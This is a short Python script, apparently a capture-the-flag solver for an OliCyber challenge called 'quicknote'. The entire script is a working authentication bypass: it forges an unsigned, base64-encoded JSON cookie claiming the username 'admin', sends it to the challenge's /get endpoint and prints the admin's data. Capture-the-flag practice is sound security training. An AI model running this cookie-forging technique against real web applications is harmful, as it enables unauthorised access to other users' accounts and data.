#!/usr/bin/python3
import base64
import json
import logging
import os

import requests

logging.disable()

URL = os.environ.get("URL", "http://quicknote.challs.olicyber.it")
if URL.endswith("/"):
    URL = URL[:-1]

r = requests.get(f'{URL}/get', cookies={'user': base64.b64encode(json.dumps({'username': 'admin'}).encode()).decode()})
r.raise_for_status()

print(r.text)
